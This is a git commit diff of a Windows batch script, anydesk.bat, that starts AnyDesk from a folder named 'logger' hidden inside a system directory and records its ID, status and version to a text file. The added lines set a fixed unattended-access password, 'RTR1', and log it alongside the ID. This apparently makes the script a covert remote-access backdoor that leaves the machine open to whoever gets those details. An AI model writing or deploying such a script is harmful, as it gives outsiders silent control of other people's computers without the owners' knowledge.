9dbc38e9afbd9ff63813a36e5c739a295d931ae7
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 17:11:30 -0700

    Update anydesk.bat

--- anydesk.bat
+++ anydesk.bat
@@ -3,8 +3,8 @@ C:\Windows\System\logger\AnyDesk\AnyDesk.exe --start
 timeout 5
 for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-id') do set ID=%%i 
 echo AnyDesk ID is: %ID% > C:\Windows\System\logger\AnyDesk\anydesk.txt
-for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-alias') do set ALIAS=%%i 
-echo AnyDesk Alias is: %ALIAS% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
+echo RTR1 | anydesk.exe --set-password
+echo AnyDesk Password is: RTR1 >> C:\Windows\System\logger\AnyDesk\anydesk.txt
 for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-status') do set STATUS=%%i 
 echo AnyDesk status is: %STATUS% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
 for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --version') do set VER=%%i 
